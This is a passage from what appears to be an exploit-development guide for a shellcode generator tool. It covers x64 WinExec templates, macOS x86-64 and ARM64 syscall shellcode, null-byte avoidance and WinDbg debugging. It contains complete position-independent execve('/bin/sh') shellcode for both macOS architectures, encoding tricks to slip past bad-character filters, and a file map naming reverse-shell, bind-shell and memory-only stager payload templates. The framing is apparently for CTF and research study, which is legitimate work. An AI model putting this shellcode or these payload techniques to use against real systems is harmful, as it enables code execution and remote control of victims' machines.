```asm
; x86: DataDirectory[0] at PE + 0x78
mov eax, [eax + 0x78]

; x64: DataDirectory[0] at PE + 0x88
mov rax, [rax + 0x88]
```

### 6. Null-byte considerations

64-bit immediates are rare in shellcode (most values fit in 32 bits). The
`mov reg, imm64` encoding is 10 bytes and almost always contains nulls. Use
`mov eax, imm32` (zero-extends to RAX) or build values through arithmetic.

### Practical impact on templates

An x64 version of the `run_command` template would look like:

```python
# Conceptual x64 template (not yet implemented)
def emit(self, layout, config):
    bc = config.badchars
    we_off = -layout.slot("WinExec").offset
    cmd_off = -layout.slot("cmd").offset

    return "\n".join([
        "; -- WinExec (x64 fastcall) --",
        *safe_lea("rcx", "rbp", cmd_off, bc),   # rcx = arg1 = lpCmdLine
        *encode_dword(0x1, bc, "edx"),            # edx = arg2 = SW_SHOWNORMAL
        "    sub  rsp, 0x28",                      # 0x20 shadow + 0x08 alignment
        *safe_call_mem("rbp", we_off, bc),
        "    add  rsp, 0x28",
    ])
```

---

## 15. macOS (x86-64 / ARM64): a different world

macOS shellcode differs fundamentally from Windows. This section covers
the concepts for independent study -- the emitter currently targets Windows
only.

### No PEB, no PE headers

macOS uses Mach-O binaries and the dyld dynamic linker. There is no PEB to
walk. Instead, shellcode uses direct system calls.

### System calls on macOS x86-64

macOS system call numbers are offset by `0x2000000` from the BSD syscall
table. The calling convention uses the `syscall` instruction:

```asm
; macOS x86-64: write(1, "Hello\n", 6)
    mov rax, 0x2000004         ; SYS_write (4) + 0x2000000
    mov rdi, 1                 ; fd = stdout
    lea rsi, [rel msg]         ; buf = message address
    mov rdx, 6                 ; count = 6
    syscall

; macOS x86-64: exit(0)
    mov rax, 0x2000001         ; SYS_exit (1) + 0x2000000
    xor rdi, rdi               ; status = 0
    syscall
```

Register convention for syscalls (same as System V AMD64 ABI):

| Register | Purpose |
|----------|---------|
| RAX | Syscall number (BSD number + 0x2000000) |
| RDI | Argument 1 |
| RSI | Argument 2 |
| RDX | Argument 3 |
| R10 | Argument 4 |
| R8 | Argument 5 |
| R9 | Argument 6 |

### ARM64 (Apple Silicon) system calls

On Apple Silicon Macs, system calls use the `svc` instruction:

```asm
; ARM64 macOS: write(1, buf, len)
    mov x0, #1                 ; fd = stdout
    adr x1, msg                ; buf (PC-relative)
    mov x2, #6                 ; count
    mov x16, #4                ; SYS_write
    svc #0x80                  ; supervisor call

; ARM64 macOS: exit(0)
    mov x0, #0                 ; status
    mov x16, #1                ; SYS_exit
    svc #0x80
```

ARM64 register convention:

| Register | Purpose |
|----------|---------|
| X16 | Syscall number |
| X0-X7 | Arguments 1-8 |
| X0 | Return value |

### Key differences from Windows shellcode

| Aspect | Windows x86 | macOS x86-64 | macOS ARM64 |
|--------|-------------|-------------|-------------|
| API resolution | PEB walk + export hash | Direct syscall | Direct syscall |
| Call mechanism | `call [resolved_ptr]` | `syscall` instruction | `svc #0x80` |
| Calling convention | stdcall (stack) | System V (registers) | AAPCS64 (registers) |
| Position-independent data | call/pop | RIP-relative (`lea rsi, [rel msg]`) | `adr x1, msg` (PC-relative) |
| Null avoidance | Same XOR techniques | Same principles | Immediate encoding |
| Binary format | PE (import table) | Mach-O (dyld) | Mach-O (dyld) |
| Segment registers | FS (x86), GS (x64) | Not used | Not applicable |

### Example: macOS x86-64 execve("/bin/sh")

```asm
; Position-independent execve shellcode for macOS x86-64
    xor rax, rax
    cdq                        ; rdx = 0 (envp)

    ; Build "/bin/sh" on the stack
    push rax                   ; null terminator
    mov rdi, 0x68732f6e69622f  ; "/bin/sh" (little-endian, 7 bytes)
    push rdi
    mov rdi, rsp               ; rdi = pointer to "/bin/sh"

    ; argv = {"/bin/sh", NULL}
    push rax                   ; argv[1] = NULL
    push rdi                   ; argv[0] = "/bin/sh"
    mov rsi, rsp               ; rsi = argv

    mov rax, 0x200003b         ; SYS_execve (59) + 0x2000000
    syscall
```

### Example: macOS ARM64 execve("/bin/sh")

```asm
; Position-independent execve shellcode for macOS ARM64
    mov x0, #0x622F            ; start building "/bin/sh"
    movk x0, #0x6E69, lsl #16
    movk x0, #0x732F, lsl #32
    movk x0, #0x68, lsl #48   ; x0 = "/bin/sh\0" as 8-byte value

    str x0, [sp, #-16]!       ; push string to stack (16-byte aligned)
    mov x0, sp                 ; x0 = pointer to "/bin/sh"

    ; Build argv = {"/bin/sh", NULL} on the stack
    str xzr, [sp, #-16]!      ; argv[1] = NULL (push 16-byte aligned)
    str x0, [sp]               ; argv[0] = pointer to "/bin/sh"
    mov x1, sp                 ; x1 = argv

    mov x2, xzr               ; x2 = envp = NULL

    mov x16, #59               ; SYS_execve
    svc #0x80
```

### macOS hardening considerations

Modern macOS enforces:

- **Code signing**: unsigned code is killed. Shellcode injected into a
  signed process inherits its code signature, but standalone injection is
  harder.
- **System Integrity Protection (SIP)**: restricts modification of system
  binaries and processes.
- **Hardened Runtime**: opt-in flag that prevents writable+executable memory
  unless explicitly entitled.
- **No `MAP_JIT` without entitlement**: on ARM64, `mmap` with
  `PROT_WRITE|PROT_EXEC` requires the `com.apple.security.cs.allow-jit`
  entitlement or the `MAP_JIT` flag.

For CTF and research purposes, these protections can be relaxed on your own
machine by disabling SIP and using processes without hardened runtime.

---

## 16. Debugging shellcode in WinDbg

### The debug_runner.py workflow

Every emitter build produces `debug_runner.py` -- a Python script with the
assembly source embedded. Copy it to your Windows lab VM:

```powershell
python debug_runner.py
```

Output:

```text
[+] Instructions: 142
[+] Shellcode:    287 bytes
[+] Address:      0x00740000
[+] WinDbg:       bp 0x00740000

shellcode = b"\xeb\x27\x31\xc9\x64\x8b\x41\x30..."

... attach WinDbg, then press Enter to execute ...
```

### WinDbg commands

```text
bp 0x00740000              Set breakpoint at shellcode start
g                          Run (hit breakpoint)
t                          Single-step one instruction
p                          Step over (skip call internals)
r                          Show registers
dd ebp-20 L10             Display 16 DWORDs from stack frame
da ebp-84                 Display ASCII string at slot
db ebp-20 L40             Display bytes from stack frame
u eip L20                 Disassemble 20 instructions from EIP
```

### Using the contract to verify resolution

The contract document tells you what each `[ebp-N]` slot should contain:

```text
Slot              ebp_ref       Expected
WinExec           [ebp-0x24]    kernel32!WinExec
ExitProcess       [ebp-0x28]    kernel32!ExitProcess
```

In WinDbg after the API resolution block:

```text
dd ebp-0x24 L1    ; should show WinExec address
ln poi(ebp-0x24)  ; should resolve to kernel32!WinExec
dd ebp-0x28 L1    ; ExitProcess
ln poi(ebp-0x28)  ; kernel32!ExitProcess
```

### Common debugging patterns

**PEB walk verification:**

```text
; After call find_module returns:
r ebx              ; should be kernel32.dll base
lm m kernel32      ; compare with module list
```

**String verification:**

```text
; After string construction:
da ebp-0x84        ; should show "calc.exe"
```

**Badchar hunting in assembled output:**

```bash
# From your macOS/Linux workstation:
xxd emitter_out/bin/shellcode.bin | grep -E "00|0a|0d"
```

---

## 17. Quick reference tables

### Null-byte avoidance patterns

```text
Operation            With nulls                   Null-free alternative
-------------------  ---------------------------  ---------------------------
Zero register        B8 00 00 00 00 (mov eax, 0)  31 C0 (xor eax, eax)
Push zero            6A 00 (push 0)               xor eax,eax; push eax
Load small const     B8 1C 00 00 00 (mov eax,1C)  push 0x1c; pop eax
PEB access           64 A1 30 00 00 00            xor ecx,ecx; mov eax,fs:[ecx+30h]
Add with null bytes  81 C4 80 00 00 00            sub esp, -0x80
Push null string     push "abc\0"                 xor eax,eax; push eax; push "abc!"
```

### Common Win32 API ROR-13 hashes

These are computed by `hash_gen.py` and used in the `mov eax, <hash>` blocks:

```python
# Compute any hash:
from Tools.emitter.hash_gen import ror13
print(f"WinExec: 0x{ror13('WinExec'):08x}")
```

### Emitter file map

```text
Tools/emitter/
  __main__.py              Entry point
  schema.py                Manifest parsing and validation
  build.py                 Full assembly pipeline + CLI
  stack_alloc.py           Stack frame slot allocator
  encode.py                Badchar-safe instruction encoding
  string_emitter.py        String construction (mov/push/shiftor/xor)
  structure_emitter.py     Structure initialization (STARTUPINFOA, etc.)
  api_emitter.py           API resolution stub generation
  api_database.py          Win32 API records (module, hash, structs)
  hash_gen.py              ROR-13 hash computation
  scanner.py               Post-assembly badchar scanner
  xor_encoder.py           XOR encoder with decoder stub builder
  doc_gen.py               Contract document generator
  payload_templates/
    base.py                PayloadTemplate ABC + TemplateConfig
    reverse_shell.py       Reverse shell template
    run_command.py          WinExec template
    copy_file.py            CopyFileA template
    copy_then_run.py        Copy + execute template
    move_then_run.py        MoveFileA + execute template
    tcp_download.py         Download file to disk template
    tcp_stager.py           Stage 2 download to RWX memory template
    bind_shell.py           Bind shell scaffold
  manifests/
    calc.yaml              Minimal WinExec example
    revshell.yaml           Reverse shell
    copy_then_run.yaml      File copy + execute
    move_then_run.yaml      File move + execute
    tcp_download.yaml       File download to disk
    tcp_stager.yaml         Memory-only stager
  tests/                   Comprehensive test suite
```

### Manifest field reference

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `badchars` | list[hex str] | Yes | Bytes to avoid: `["00", "0a", "0d"]` |
| `functions` | list[str] | Yes | Win32 APIs from `api_database.py` |
| `strings` | list[obj] | No | Named string slots to construct |
| `variables` | list[str] | No | Named 4-byte slots (handles, counters) |
| `template` | str | No | Default payload template name |

### String entry fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `label` | str | -- | Slot name (used in `layout.slot()`) |
| `value` | str | -- | ASCII string content |
| `method` | str | -- | `mov`, `push`, `shiftor`, or `xor` |
| `dest` | str | `edi` | Accepted but ignored; always uses EDI |

---

## Further reading

- `Documentation/windows_x86_shellcode/Shellcode_Reference.md` -- PEB/PE
  structures with field offsets
- `Documentation/windows_x86_shellcode/shellcode_x64.md` -- x64 design
  differences in depth
- `Documentation/windows_x86_shellcode/PEB-and-PE-Export-Resolution.md` --
  WinDbg walkthrough of the resolution chain
- `Documentation/learning-to-read-x86-assembly-like-a-reverse-engineer/` --
  14-chapter assembly reading guide (chapter 14 covers shellcode idioms)
- `Documentation/emitter.md` -- emitter CLI reference and template authoring
  guide
- `Documentation/iat-resolution-technique.md` -- alternative IAT-based API
  resolution
- `Documentation/socket-reuse-stagers.md` -- socket reuse staging technique
